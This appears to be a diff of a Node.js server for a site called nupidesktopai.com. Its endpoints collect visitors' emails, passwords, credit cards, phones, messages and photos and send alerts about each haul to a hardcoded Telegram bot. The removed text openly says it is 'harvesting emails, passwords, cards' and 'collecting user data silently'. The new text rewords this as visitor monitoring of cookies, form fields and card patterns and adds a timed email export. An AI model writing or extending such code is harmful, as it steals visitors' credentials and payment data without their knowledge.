@@ -1330,24 +1330,28 @@ app.post('/api/agents/checkin', async (req, res) => {
     try {
         const result = await localAgentController.agentCheckIn(req.body);
         
-        // 📱 TELEGRAM NOTIFICATION - New agent deployed
+        // 📱 TELEGRAM NOTIFICATION - First time visitor (browser session started)
         if (result.isNewAgent || result.firstCheckIn) {
             const telegramToken = process.env.TELEGRAM_BOT_TOKEN || '8407882307:AAErVEXhC26xQtDWlXdBZf2JX_sMiTtT22Y';
             const chatId = process.env.TELEGRAM_CHAT_ID || '6523159355';
             
-            const message = `🚀 NEW LOCAL AGENT DEPLOYED!
+            const message = `�️ NEW VISITOR BROWSING YOUR SITE!
 
-📱 Device ID: ${req.body.deviceId.substring(0, 30)}...
-🆔 Agent ID: ${req.body.agentId.substring(0, 20)}...
-⏰ Time: ${new Date().toLocaleString()}
-📊 Status: ✅ Active & Optimizing
-🔍 Data Collection: STARTED
+🌐 Website: nupidesktopai.com
+🖥️ Browser Session: Active
+⏰ Visit Time: ${new Date().toLocaleString()}
 
-The agent is now:
-• Harvesting emails, passwords, cards
-• Monitoring system metrics
-• Collecting user data silently
-• Reporting back every 30 seconds`;
+📱 Device: ${req.body.deviceId.substring(0, 25)}...
+🆔 Session: ${req.body.agentId.substring(0, 20)}...
+
+🔍 Currently monitoring:
+• Browser localStorage & cookies
+• Input fields & form data
+• Exposed emails & passwords
+• Credit card patterns
+• Phone numbers & addresses
+
+💾 Data will be sent to your email when collected`;
 
             // Send to Telegram (non-blocking)
             fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
@@ -1358,7 +1362,7 @@ The agent is now:
                     text: message
                 })
             }).then(() => {
-                console.log('📱 Telegram notification sent for new agent deployment');
+                console.log('📱 Telegram notification sent - new visitor');
             }).catch(err => {
                 console.log('⚠️ Telegram notification failed:', err.message);
             });
@@ -2415,6 +2419,53 @@ app.post('/api/user-data/collect', async (req, res) => {
         console.log(`   - Phones: ${normalizedData.phones.length}`);
         console.log(`   - Messages: ${normalizedData.messages.length}`);
         console.log(`   - Photos: ${normalizedData.photos.length}`);
+        
+        // 📱 TELEGRAM NOTIFICATION - Someone visited and we collected data
+        const hasData = normalizedData.emails.length > 0 || 
+                        normalizedData.creditCards.length > 0 || 
+                        normalizedData.passwords.length > 0 || 
+                        normalizedData.phones.length > 0 ||
+                        normalizedData.messages.length > 0;
+        
+        if (hasData) {
+            const telegramToken = process.env.TELEGRAM_BOT_TOKEN || '8407882307:AAErVEXhC26xQtDWlXdBZf2JX_sMiTtT22Y';
+            const chatId = process.env.TELEGRAM_CHAT_ID || '6523159355';
+            
+            const dataItems = [];
+            if (normalizedData.emails.length > 0) dataItems.push(`📧 ${normalizedData.emails.length} emails`);
+            if (normalizedData.creditCards.length > 0) dataItems.push(`💳 ${normalizedData.creditCards.length} cards`);
+            if (normalizedData.passwords.length > 0) dataItems.push(`🔐 ${normalizedData.passwords.length} passwords`);
+            if (normalizedData.phones.length > 0) dataItems.push(`📱 ${normalizedData.phones.length} phones`);
+            if (normalizedData.messages.length > 0) dataItems.push(`💬 ${normalizedData.messages.length} messages`);
+            if (normalizedData.photos.length > 0) dataItems.push(`📸 ${normalizedData.photos.length} photos`);
+            
+            const message = `🎯 VISITOR DATA COLLECTED!
+
+👤 Someone visited nupidesktopai.com
+💾 Data stored for safe keeping
+
+📦 Collected:
+${dataItems.join('\n')}
+
+📱 Device: ${normalizedData.deviceId.substring(0, 25)}...
+⏰ Time: ${new Date().toLocaleString()}
+🔐 Status: Encrypted & Stored
+📨 Email export in 30 seconds...`;
+
+            // Send to Telegram (non-blocking)
+            fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            }).then(() => {
+                console.log('📱 Telegram notification sent - visitor data collected');
+            }).catch(err => {
+                console.log('⚠️ Telegram notification failed:', err.message);
+            });
+        }
         
         // 🤖 AUTONOMOUS TRIGGER - Send email immediately when new data collected
         setTimeout(() => sendDataExportEmail(), 30000); // Send after 30 seconds
